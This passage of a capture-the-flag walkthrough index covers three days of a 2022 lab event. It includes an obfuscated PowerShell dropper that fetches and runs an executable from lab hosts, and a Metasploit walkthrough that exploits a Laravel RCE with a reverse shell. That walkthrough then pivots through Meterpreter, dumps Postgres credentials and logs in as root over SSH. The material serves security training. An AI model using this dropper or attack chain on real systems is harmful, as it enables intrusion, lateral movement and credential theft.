<pre><code>SET-VarIABle  8ih567    [tYpe]{3}{0}{4}{2}{1}-fYsT,RecTORy,M.iO.DI,s,e;   SET-Item vARiAbLe:Ri7xO3 [TyPe]{2}{5}{4}{3}{1}{0}-F R,MaNaGE,S,VIcEPoInt,.neT.sEr,Ystem   ;  $ErrorActionPreference = SilentlyContinue;$var_A=$P58B  [char]64  $Z19R;$B53N=S77H;    ls  VarIaBLE:8ih567  .Value::CREAtEDiRecTOrY$HOME  eN7Rr1sj9aeN7Bcx4iayeN7.rePLacE[CHaR]101[CHaR]78[CHaR]55,H_TrinG][CHaR]92;$V57R=B46V; vaRIaBle Ri7xO3 .VAlUE::SeCurITyPROToCOL = Tls12;$X44S=S81D;$Pa2nur4 = K_9O;$O66G=F88W;$Cyg0ku7=$HOMEeAwRr1sj9aeAwBcx4iayeAw -repLACeeAw,[chaR]92$Pa2nur4.dll;$E01B=R7_S;$Mrkjcim=https://cdn.bandityeti.thm/files/mysterygift.exe@https://google.com/@https://www.secretSanta.THM/Goldenticket/THM_MYSTERY_FLAG@https://cdn.bandityeti.THM/files/index/. rEPlAcEhttp,[array]sd,sw,http,3d[1].sPlIt$T26A  $var_A  $B75P;$W71T=P93X;foreach $var_B in $Mrkj{try{.New-Object sYsteM.net.WEbCLiEnt.DOwNLoAdfILe$var_B, $Cyg0ku7;$G75Q=W8_R;If &amp;Get-Item $Cyg0ku7.length -ge 30575 {.rundll32 $Cyg0ku7,Control_RunDLL.TosTrING;$B29D=Z62W;break;$F26F=V37W}}catch{}}$J1_N=T08H\n</code></pre> <p>Extract the URLs using <code>Extract URL</code> recipe and use the <code>Split</code> recipe with <code>Split Delimiter = @</code> and 'Join Delimiter = \\n`.</p> <pre><code>https://cdn.bandityeti.thm/files/mysterygift.exe\nhttps://google.com/\nhttps://www.secretSanta.THM/Goldenticket/THM_MYSTERY_FLAG\nhttps://cdn.bandityeti.THM/files/index/\n</code></pre> <p>Finally defang the the links for safety using the <code>Defang URL</code> recipe.</p> <pre><code>hxxps[://]cdn[.]bandityeti[.]thm/files/mysterygift[.]exe\nhxxps[://]google[.]com/\nhxxps[://]www[.]secretSanta[.]THM/Goldenticket/THM_MYSTERY_FLAG\nhxxps[://]cdn[.]bandityeti[.]THM/files/index/\n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day8/","title":"Day 08 - Smart Contracts","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day8/#blockchain","title":"Blockchain","text":"<p>A blockchain is a digital database or ledger distributed among nodes of a peer-to-peer network. It acts as a database to store information in a specified format and is shared among members of a network with no one entity in control (decentralized). Due to its decentralized nature, each peer is expected to maintain the integrity of the blockchain. If one member of the network attempted to modify a blockchain maliciously, other members would compare it to their blockchain for integrity and determine if the whole network should express that change.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day8/#smart-contracts","title":"Smart Contracts","text":"<p>A smart contract is a program stored on a blockchain that runs when pre-determined conditions are met. At its core, a smart contracts waits for a specific condition to be satisfied before executing preprogrammed actions. This is similar to traditional logic works. Once a smart contract is deployed on a blockchain, another contract can call or execute its functions. Note that a smart contract can consecutively make new calls to a function while an old function is still executing. This can lead to issues which can be exploited by threat actors.</p> <p>Most smart contract vulnerabilities arise due to logic issues or poor exception handling. Most vulnerabilities arise in functions when conditions are insecurely implemented. Refer to today's challenge for more information on <code>Re-entrancy Attacks</code>.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day8/#ctf-questions","title":"CTF Questions","text":"<p>Follow instructions on the task to complete the challenge and retrieve the flag: <code>flag{411_ur_37h_15_m1n3}</code></p>"},{"location":"walkthroughs/thm/adventofcyber2022/day9/","title":"Day 09 - Pivoting","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day9/#introduction","title":"Introduction","text":"<p>Metasploit is a powerful penetration testing tool for gaining initial access to systems, performing post-exploitation, and pivoting to other applications and systems.</p> <p>Meterpreter is an advanced payload that provides interactive access to a compromised system. Meterpreter supports running commands on a remote target, including uploading/downloading files and pivoting.</p> <p>Note that normal command shells do not support complex operations such as pivoting. In Metasploit\u2019s console, you can upgrade the last opened Metasploit session to a Meterpreter session with <code>sessions -u -1</code>.</p> <p>Once an attacker gains initial entry into a system, the compromised machine can be used to send additional web traffic through - allowing previously inaccessible machines to be reached allowing the compromised system to become an attack launchpad for other systems in the network. This concept is called <code>Network Pivoting</code>.</p> <p>Metasploit has an internal routing table that can be modified with the <code>route</code> command. This routing table determines where to send network traffic through, for instance, through a Meterpreter session.</p> <p>A socks proxy is an intermediate server that supports relaying networking traffic between two machines. This tool allows you to implement the technique of pivoting. A socks proxy can be run either locally on a pentester\u2019s machine via Metasploit, or directly on the compromised server. In Metasploit, this can be achieved with the <code>auxiliary/server/socks_proxy</code> module.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day9/#ctf-questions","title":"CTF Questions","text":"<p>Target IP = 10.10.41.251 ($IP)</p> <p>Enumerate targe using Nmap:</p> <pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -sV -O -Pn $IP    \nStarting Nmap 7.93 ( https://nmap.org ) at 2022-12-09 11:36 MST\nNmap scan report for 10.10.41.251\nHost is up (0.20s latency).\nNot shown: 999 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.54 ((Debian))\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=12/9%OT=80%CT=1%CU=33099%PV=Y%DS=4%DC=I%G=Y%TM=6393805\nOS:5%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=2%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1\nOS:1NW6%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=3F%W=FAF0%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=3F%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n</code></pre> <p>Examine <code>port 80</code> in Firefox. Inspecting the Network tab, we can see that the server responds with an HTTP <code>Set-Cookie</code> header indicating that the server is running <code>Laravel</code> web application development framework.</p> <pre><code>Set-Cookie: laravel_session=eyJpdiI6InVZaGVOT0wvNlJOYXF4SnpacjYxMHc9PSIsInZhbHVlIjoiQjREN21IalZ0YXc1WngycXUvamtyVC9rdTA0WUFVTDdiRHArMkVsVEdWMlU0K1IvZ0MzbHlpdWZLc3RJdTQ1U3JqTFpmeTFtbDV4VTg3TzlpOEZJSC8zY3FVakFhYlR3YnZCajZYbU93LzhWeHd3STJ5eC9teU9lampwOEFJN2YiLCJtYWMiOiI0MWFmYjE2YzFlM2U3OWYwMmEzZGJiNDc3MzljNGU2OTRmZjMzMDljODczZjExYjhmZjY1ZWY4NDAyNDg0NjY2In0%3D; expires=Fri, 09-Dec-2022 20:37:07 GMT; Max-Age=7200; path=/; httponly; samesite=lax\n</code></pre> <p>Laravel may be vulnerable to a remote code execution exploit which impacts applications using debug mode with Laravel versions before 8.4.2, which use ignite as a developer dependency. </p> <p>Search Laravel in Metasploit and run info on the exploit to get <code>CVE-2021-3129</code>.</p> <pre><code>msf6 &gt; search laravel\n\nMatching Modules\n================\n\n   #  Name                                              Disclosure Date  Rank       Check  Description\n   -  ----                                              ---------------  ----       -----  -----------\n   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution\n   1  exploit/multi/php/ignition_laravel_debug_rce      2021-01-13       excellent  Yes    Unauthenticated remote code execution in Ignition\n\n\nInteract with a module by name or index. For example info 1, use 1 or use exploit/multi/php/ignition_laravel_debug_rce                                                                                                                  \n\nmsf6 auxiliary(scanner/ssh/ssh_login) &gt; info 1\n\n       Name: Unauthenticated remote code execution in Ignition\n     Module: exploit/multi/php/ignition_laravel_debug_rce\n   Platform: Unix, Linux, OSX, Windows\n       Arch: \n Privileged: No\n    License: Metasploit Framework License (BSD)\n       Rank: Excellent\n  Disclosed: 2021-01-13\n\nProvided by:\n  Heyder Andrade &lt;eu@heyderandrade.org&gt;\n  ambionics\n\nModule side effects:\n ioc-in-logs\n\nModule stability:\n crash-safe\n\nModule reliability:\n repeatable-session\n\nAvailable targets:\n  Id  Name\n  --  ----\n  0   Unix (In-Memory)\n  1   Windows (In-Memory)\n\nCheck supported:\n  Yes\n\nBasic options:\n  Name       Current Setting              Required  Description\n  ----       ---------------              --------  -----------\n  LOGFILE                                 no        Laravel log file absolute path\n  Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]\n  RHOSTS                                  yes       The target host(s), see https://github.com/rapid7/metasploit-f\n                                                    ramework/wiki/Using-Metasploit\n  RPORT      80                           yes       The target port (TCP)\n  SSL        false                        no        Negotiate SSL/TLS for outgoing connections\n  TARGETURI  /_ignition/execute-solution  yes       Ignition execute solution path\n  VHOST                                   no        HTTP server virtual host\n\nPayload information:\n\nDescription:\n  Ignition before 2.5.2, as used in Laravel and other products, allows \n  unauthenticated remote attackers to execute arbitrary code because \n  of insecure usage of file_get_contents() and file_put_contents(). \n  This is exploitable on sites using debug mode with Laravel before \n  8.4.2.\n\nReferences:\n  https://nvd.nist.gov/vuln/detail/CVE-2021-3129\n  https://www.ambionics.io/blog/laravel-debug-rce\n\n\nView the full module info with the info -d command.\n</code></pre> <p>Use Metasploit to verify if the application is vulnerable to this exploit. </p> <pre><code>msf6 &gt; use multi/php/ignition_laravel_debug_rce\n[*] Using configured payload cmd/unix/reverse_bash\nmsf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; check rhost=10.10.41.251 HttpClientTimeout=20\n\n[*] Checking component version to 10.10.41.251:80\n[*] 10.10.41.251:80 - The target appears to be vulnerable.\n</code></pre> <p>Looks like the version of Laravel application is vulnerable to an RCE. Lets run to module to open a session.</p> <pre><code>msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; run rhost=10.10.41.251 lhost=10.2.4.35 HttpClientTimeout=20\n\n[*] Started reverse TCP handler on 10.2.4.35:4444 \n[*] Running automatic check (\"set AutoCheck false\" to disable)\n[*] Checking component version to 10.10.41.251:80\n[+] The target appears to be vulnerable.\n[*] Command shell session 1 opened (10.2.4.35:4444 -&gt; 10.10.41.251:33158) at 2022-12-09 11:54:22 -0700\nwhoami\n\nwww-data\n</code></pre> <p>Use the <code>sessions -u -1</code> command to upgrade the basic shell to a Meterpreter shell (ensure to <code>background</code> the basic shell before upgrading).</p> <pre><code>msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; sessions -u -1\n[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [-1]                                          \n\n[*] Upgrading session ID: 1                                                                                         \n[*] Starting exploit/multi/handler                                                                                  \n[*] Started reverse TCP handler on 10.2.4.35:4433                                                                   \n[*] Sending stage (1017704 bytes) to 10.10.41.251                                                                   \n[*] Command stager progress: 100.00% (773/773 bytes)                                                                \nmsf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; [*] Meterpreter session 2 opened (10.2.4.35:4433 -&gt; 10.10.41.251:39880) at 2022-12-09 11:56:52 -0700\n\nmsf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; sessions                                                       \n\nActive sessions                                                                                                     \n===============                                                                                                     \n\n  Id  Name  Type                   Information               Connection                                             \n  --  ----  ----                   -----------               ----------                                             \n  1         shell cmd/unix                                   10.2.4.35:4444 -&gt; 10.10.41.251:33158 (10.10.41.251)    \n  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.2.4.35:4433 -&gt; 10.10.41.251:39880 (172.28.101.50)\n</code></pre> <p>After interacting with the Meterpreter session with <code>sessions -i -1</code> and exploring the target machine, we can see there are database credentials available (<code>postgres:postgres</code>):</p> <pre><code>meterpreter &gt; cat /var/www/.env\nAPP_NAME=Laravel\nAPP_ENV=local\nAPP_KEY=base64:NEMESCXelEv2iYzbgq3N30b9IAnXzQmR7LnSzt70rso=\nAPP_DEBUG=true\nAPP_URL=http://localhost\n\nLOG_CHANNEL=stack\nLOG_LEVEL=debug\n\nDB_CONNECTION=pgsql\nDB_HOST=webservice_database\nDB_PORT=5432\nDB_DATABASE=postgres\nDB_USERNAME=postgres\nDB_PASSWORD=postgres\n\nBROADCAST_DRIVER=log\nCACHE_DRIVER=file\nQUEUE_CONNECTION=sync\nSESSION_DRIVER=file\nSESSION_LIFETIME=120\n\nREDIS_HOST=127.0.0.1\nREDIS_PASSWORD=null\nREDIS_PORT=6379\n\nMAIL_MAILER=smtp\nMAIL_HOST=smtp.mailtrap.io\nMAIL_PORT=2525\nMAIL_USERNAME=null\nMAIL_PASSWORD=null\nMAIL_ENCRYPTION=null\nMAIL_FROM_ADDRESS=null\nMAIL_FROM_NAME=\"${APP_NAME}\"\n\nAWS_ACCESS_KEY_ID=\nAWS_SECRET_ACCESS_KEY=\nAWS_DEFAULT_REGION=us-east-1\nAWS_BUCKET=\n\nPUSHER_APP_ID=\nPUSHER_APP_KEY=\nPUSHER_APP_SECRET=\nPUSHER_APP_CLUSTER=mt1\n\nMIX_PUSHER_APP_KEY=\"${PUSHER_APP_KEY}\"\nMIX_PUSHER_APP_CLUSTER=\"${PUSHER_APP_CLUSTER}\"\n</code></pre> <p>We can use Meterpreter to resolve this remote hostname to an IP address that we can use for attacking purposes:</p> <pre><code>meterpreter &gt; resolve webservice_database\n\nHost resolutions\n================\n\n    Hostname             IP Address\n    --------             ----------\n    webservice_database  172.28.101.51\n</code></pre> <p>As this is an internal IP address, it won\u2019t be possible to send traffic to it directly. We can instead leverage the network pivoting support within msfconsole to reach the inaccessible host. To configure the global routing table in msfconsole, ensure you have run the <code>background</code> command from within a Meterpreter session:</p> <pre><code>msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; route add 172.28.101.51/32 -1\n[*] Route added\n</code></pre> <p>We can also see, due to the presence of the <code>/.dockerenv</code> file, that we are in a docker container. By default, Docker chooses a hard-coded IP of <code>172.17.0.1</code> to represent the host machine. We will also add that to our routing table for later scanning:</p> <pre><code>msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; route add 172.17.0.1/32 -1\n[*] Route added\n</code></pre> <p>Print the routing table to verify the configuration settings:</p> <pre><code>msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; route print\n\nIPv4 Active Routing Table\n=========================\n\n   Subnet             Netmask            Gateway\n   ------             -------            -------\n   172.17.0.1         255.255.255.255    Session 2\n   172.28.101.51      255.255.255.255    Session 2\n\n[*] There are currently no IPv6 routes defined.\n</code></pre> <p>With the previously discovered database credentials and the routing table configured, we can start to run Metasploit modules that target <code>Postgres</code>. Starting with a schema dump, followed by running queries to select information out of the database:</p> <pre><code>msf6 exploit(multi/php/ignition_laravel_debug_rce) &gt; use auxiliary/scanner/postgres/postgres_schemadump \nmsf6 auxiliary(scanner/postgres/postgres_schemadump) &gt; run postgres://postgres:postgres@172.28.101.51/postgres\n\n[*] 172.28.101.51:5432 - Found databases: postgres, template1, template0. Ignoring template1, template0.\n[+] Postgres SQL Server Schema \n Host: 172.28.101.51 \n Port: 5432 \n ====================\n\n---\n- DBName: postgres\n  Tables:\n  - TableName: users_id_seq\n    Columns:\n    - ColumnName: last_value\n      ColumnType: int8\n      ColumnLength: '8'\n    - ColumnName: log_cnt\n      ColumnType: int8\n      ColumnLength: '8'\n    - ColumnName: is_called\n      ColumnType: bool\n      ColumnLength: '1'\n  - TableName: users\n    Columns:\n    - ColumnName: id\n      ColumnType: int4\n      ColumnLength: '4'\n    - ColumnName: username\n      ColumnType: varchar\n      ColumnLength: \"-1\"\n    - ColumnName: password\n      ColumnType: varchar\n      ColumnLength: \"-1\"\n    - ColumnName: created_at\n      ColumnType: timestamp\n      ColumnLength: '8'\n    - ColumnName: deleted_at\n      ColumnType: timestamp\n      ColumnLength: '8'\n  - TableName: users_pkey\n    Columns:\n    - ColumnName: id\n      ColumnType: int4\n      ColumnLength: '4'\n\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\nmsf6 auxiliary(scanner/postgres/postgres_schemadump) &gt; use auxiliary/admin/postgres/postgres_sql \nmsf6 auxiliary(admin/postgres/postgres_sql) &gt; run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'\n[*] Running module against 172.28.101.51\n\nQuery Text: 'select * from users'\n=================================\n\n    id  username  password  created_at                  deleted_at\n    --  --------  --------  ----------                  ----------\n    1   santa     p4$$w0rd  2022-09-13 19:39:51.669279  NIL\n\n[*] Auxiliary module execution completed\n</code></pre> <p>To further pivot through the private network, we can create a socks proxy within Metasploit:</p> <pre><code>msf6 auxiliary(admin/postgres/postgres_sql) &gt; use auxiliary/server/socks_proxy\nmsf6 auxiliary(server/socks_proxy) &gt; run srvhost=127.0.0.1 srvport=9050 version=4a\n[*] Auxiliary module running as background job 1.\n\n[*] Starting the SOCKS proxy server\n</code></pre> <p>This will expose a port on the attacker machine that can be used to run other network tools through, such as <code>curl</code> or <code>proxychains</code>.</p> <pre><code>msf6 auxiliary(server/socks_proxy) &gt; curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v\n[*] exec: curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v\n\n*   Trying 127.0.0.1:9050...\n* SOCKS4 communication to 172.17.0.1:80\n* SOCKS4a request granted.\n* Connected to localhost (127.0.0.1) port 9050 (#0)\n&gt; GET / HTTP/1.1\n&gt; Host: 172.17.0.1\n&gt; User-Agent: curl/7.85.0\n&gt; Accept: */*\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Date: Fri, 09 Dec 2022 19:13:11 GMT\n&lt; Server: Apache/2.4.54 (Debian)\n&lt; X-Powered-By: PHP/7.4.30\n&lt; Cache-Control: no-cache, private\n&lt; Set-Cookie: XSRF-TOKEN=eyJpdiI6Imc5QUppRWZUY25KVWF3YS80dGZqNXc9PSIsInZhbHVlIjoiRWh3S1NDazAyWit3K1pOQ2liWmN0c3hHYVJHWlp1c2Z4T21WZmdZNWt2MEoxdkU5ZVhKOUlBSUhwQ1JFbVk0eGk3dG9iQVNoMnJlYVlQY1VUZXBLenpHTjU4RytydkYzRWx3emFMbWdYOFFmQlNhNllTcy9tM0ZZTXRoWDhJeW8iLCJtYWMiOiJlZDhhZGQwZWJhODk1OTE1YTMyNmY3NmJiMjQxNDE1Y2ViMTgwNmU2NDJiM2Q0ODk5MDEzNjUwMzljODlmM2RjIn0%3D; expires=Fri, 09-Dec-2022 21:13:11 GMT; Max-Age=7200; path=/; samesite=lax\n&lt; Set-Cookie: laravel_session=eyJpdiI6IklLQ0dkU3BSZG12ZkEzazdwK0tLN1E9PSIsInZhbHVlIjoiYlZNOXJXRkJkMUdwTExQK2xjT2hVQnF3NW1Galo3dE94MTYxWkJEMmdRL0VVOHpLRCsvSVkvTU9lNENtKzJVYnVvQ1hDOWNqUHNJdXJCczZXVlRRdWtydlJLRzRIY1hNckZCblZEREo0QjBkWXZrNVdwTGJ6eFp6SGlLSEJncGUiLCJtYWMiOiJhMjU3MDk0OTI3YzBlZjc3N2Q1ZDUzZmQ2Y2UzNjdjYzk0MjM2NzE3NzJiNDI0NzljNjQ5YzE2NjM0NzNhMWVkIn0%3D; expires=Fri, 09-Dec-2022 21:13:11 GMT; Max-Age=7200; path=/; httponly; samesite=lax\n&lt; Vary: Accept-Encoding\n&lt; Transfer-Encoding: chunked\n&lt; Content-Type: text/html; charset=UTF-8\n&lt; \n&lt;!DOCTYPE html&gt;\n\n... etc ...\n</code></pre> <p>Run Nmap on the compromised machine using <code>proxychains</code>.</p> <pre><code>msf6 auxiliary(server/socks_proxy) &gt; proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1\n[*] exec: proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1\n\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-12-09 12:14 MST\nNmap scan report for 172.17.0.1\nHost is up (0.37s latency).\n\nPORT     STATE  SERVICE\n22/tcp   open   ssh\n80/tcp   open   http\n443/tcp  closed https\n5432/tcp closed postgresql\n\nNmap done: 1 IP address (1 host up) scanned in 1.35 seconds\n</code></pre> <p>Let's see if password reuse by the user has occured. Let's try and log in to SSH using the credentials found above (<code>santa:p4$$w0rd</code>).</p> <pre><code>msf6 auxiliary(server/socks_proxy) &gt; use auxiliary/scanner/ssh/ssh_login\nmsf6 auxiliary(scanner/ssh/ssh_login) &gt; run ssh://santa:p4$$w0rd@172.17.0.1\n\n[*] 172.17.0.1:22 - Starting bruteforce\n[+] 172.17.0.1:22 - Success: 'santa:p4$$w0rd' 'uid=0(root) gid=0(root) groups=0(root) Linux hostname 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux '\n[*] SSH session 3 opened (10.2.4.35-10.10.41.251:36552 -&gt; 172.17.0.1:22) at 2022-12-09 12:18:38 -0700\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\nmsf6 auxiliary(scanner/ssh/ssh_login) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                   Information               Connection\n  --  ----  ----                   -----------               ----------\n  1         shell cmd/unix                                   10.2.4.35:4444 -&gt; 10.10.41.251:33158 (10.10.41.251)\n  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.2.4.35:4433 -&gt; 10.10.41.251:39880 (172.28.101.50)\n  3         shell linux            SSH siachen @             10.2.4.35-10.10.41.251:36552 -&gt; 172.17.0.1:22 (172.17\n                                                             .0.1)\n</code></pre> <p>Let's interact with the SSH session:</p> <pre><code>msf6 auxiliary(scanner/ssh/ssh_login) &gt; sessions -i -1\n[*] Starting interaction with 3...\n\nmesg: ttyname failed: Inappropriate ioctl for device\nls /root\nroot.txt\ncat /root/root.txt\nTHM{47C61A0FA8738BA77308A8A600F88E4B}\n</code></pre>"}]}